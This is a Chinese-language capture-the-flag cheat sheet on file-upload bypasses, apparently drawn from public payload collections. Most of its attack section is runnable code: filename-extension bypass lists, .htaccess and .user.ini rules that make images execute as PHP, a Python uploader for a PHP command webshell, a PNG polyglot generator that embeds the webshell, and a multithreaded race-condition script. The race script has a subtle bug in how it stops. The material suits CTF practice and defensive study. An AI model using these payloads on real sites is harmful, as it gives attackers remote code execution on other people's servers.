---
title: 文件上传绕过（含 .htaccess / 条件竞争）
category: web
tags: [文件上传, 后缀绕过, htaccess, 条件竞争, 临时文件]
signals: [上传头像, upload.php, 只允许 jpg png, 检查 content-type, 检查文件头, 需要上传 shell, 上传后被重命名, 有删除接口, 上传目录可访问]
difficulty: medium
source: "PayloadsAllTheThings / HackTricks / 公开 writeup"
tools: [burpsuite, python, requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 存在上传功能，且提示"只允许图片"、"不能上传 php"。
- 上传后返回文件路径（可访问）或保存到固定目录。
- 前端有 `accept="image/*"` 校验，但后端可能只管后缀。
- 上传成功但被随机重命名 → 需要条件竞争或 .htaccess 改变解析。
- 关键词：upload、上传、shell、绕过、.htaccess、竞争。

## 二、原理

上传漏洞的本质是**"可执行文件进入了 Web 可解析目录"**。常见防御与绕过：

| 防御 | 绕过 |
|---|---|
| 前端 JS 校验 | 抓包改请求 / 禁用 JS |
| 黑名单后缀（php/php5） | `phtml`、`pht`、`php3/4/5/7`、`.phps`、大小写 `.PHP`、`.php.`、`.php::$DATA`、`.php%00.jpg` |
| 白名单后缀（jpg/png） | 配合 `.htaccess`/`.user.ini` 改解析，或 Apache 多后缀 `a.php.jpg` |
| `Content-Type` 检查 | 改 `image/jpeg` |
| 文件头检查 | 加 `GIF89a` / `\xFF\xD8\xFF` / `\x89PNG` |
| 重命名 + 删除 | 条件竞争（上传后未删前访问） |
| 禁止含 `<?` | 用 `.htaccess` + `php_value auto_prepend_file`，或 PNG 里的 PHP 由 include 解析 |

## 三、解题步骤

1. 先确认能否绕过后缀（白名单/黑名单）。
2. 若白名单（只允许图片）→ 试 `.htaccess` 上传 + 图片马。
3. 若上传后即删（临时文件）→ 条件竞争，边传边访问。
4. 若文件名随机且可猜 → `.htaccess` 或直接包含。
5. 成功执行后读 flag。

## 四、可直接运行的脚本

绕过后缀清单：

```text
shell.php
shell.php5  shell.php4  shell.php3  shell.php7  shell.phtml  shell.pht
shell.phar  shell.phps
shell.PHP  shell.Php           # 大小写
shell.php.jpg                  # Apache 多后缀（AddHandler 时）
shell.php.                    # 末尾点（Windows 自动去掉）
shell.php::$DATA               # Windows NTFS 流
shell.php%00.jpg               # 空字节截断（PHP < 5.3.4）
shell.jpg  + Content-Type: image/jpeg
shell.php/  (路径穿越 shell.php/../shell.php)
```

`.htaccess` 打法（白名单只赦图片时）：

```apache
# 上传为 .htaccess，让 .jpg 被执行成 PHP
AddType application/x-httpd-php .jpg
# 或者：
SetHandler application/x-httpd-php
```

```php
// 或 .user.ini（PHP-FPM/CGI，无需 AllowOverride）
auto_prepend_file = shell.jpg
```

```python
import requests

# 1. 先传 .htaccess
files = {"file": (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain")}
r = requests.post("http://TARGET/upload.php", files=files)
print(r.text[:200])

# 2. 再传 shell.jpg（内容为 PHP 代码）
php = b"<?php system($_GET['c']); ?>"
files = {"file": ("shell.jpg", php, "image/jpeg")}
r = requests.post("http://TARGET/upload.php", files=files)
print(r.text[:200])

# 3. 访问
print(requests.get("http://TARGET/upload/shell.jpg?c=cat%20/flag").text)
```

图片马 + 解析（白名单 + 文件头检查）：

```python
# 1. 生成含 PHP 的合法 PNG：在 PNG 的 tEXt 块或末尾追加
import struct, zlib

def make_png_with_php(php: bytes) -> bytes:
    def chunk(t, d):
        c = t + d
        return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    idat = chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00"))
    text = chunk(b"tEXt", b"Comment\x00" + php)
    iend = chunk(b"IEND", b"")
    return sig + ihdr + idat + text + iend

open("shell.png", "wb").write(make_png_with_php(b"<?php system($_GET['c']); ?>"))
```

> 图片马只有在 `.png` 被解析为 PHP（`.htaccess`）或经 `include()` 时才执行。

条件竞争（上传后立刻删除的场景）：

```python
import requests, threading, time

TARGET = "http://TARGET"
UPLOAD = TARGET + "/upload.php"
SHELL = TARGET + "/upload/shell.php"

payload = b"<?php system($_GET['c']); ?>"

def upload_loop():
    while not stop:
        requests.post(UPLOAD, files={"file": ("shell.php", payload, "application/x-php")})

def access_loop():
    while not stop:
        r = requests.get(SHELL + "?c=cat%20/flag", timeout=3)
        if r.status_code == 200 and b"flag" in r.content:
            print("GOT:", r.text[:300])
            stop = True

stop = False
ts = [threading.Thread(target=upload_loop) for _ in range(16)]
ts += [threading.Thread(target=access_loop) for _ in range(16)]
for t in ts: t.start()
time.sleep(30)
stop = True
```

phpinfo 配合临时文件竞争（`session.upload_progress` / 临时文件 `phpXXXXXX` 需要 LFI 配合）。

## 五、常见坑 / 变体

- **上传目录不可访问**：检查 `upload/`、`uploads/`、`static/`、`files/` 路径；有的放在网站根。
- **`.htaccess` 需要 `AllowOverride All`**：Nginx 不解析 `.htaccess`，改试 `.user.ini`（PHP-FPM 才有）。
- **Nginx 的解析漏洞**：`/upload/shell.jpg/x.php` 可能被解析（`fastcgi_split_path_info` 配置不当）。
- **Windows 特性**：`shell.php.`、`shell.php::$DATA`、`shell.php `（尾随空格）。
- **文件头校验严格**：`getimagesize()` 会解析 PNG/JPEG 结构，用上面的 `tEXt` 块生成合法图片。
- **上传后改名只留扩展名**：`.htaccess` 无效，需要找别的执行点。
- 变体：**ZIP/SVG 上传**：SVG 可含 `<script>` → XSS；ZIP 解压打软链接。
- 变体：**上传覆盖配置文件**（`WEB-INF/web.xml`、`application.yml`）→ 直接 RCE。
- 变体：**条件竞争 vs 覆盖**：若文件名固定且无删除，直接覆盖不需要竞争。

## 六、参考来源

- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks - File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [OWASP Top 10 2021 - A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [OWASP WSTG - Testing for File Extension Handling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
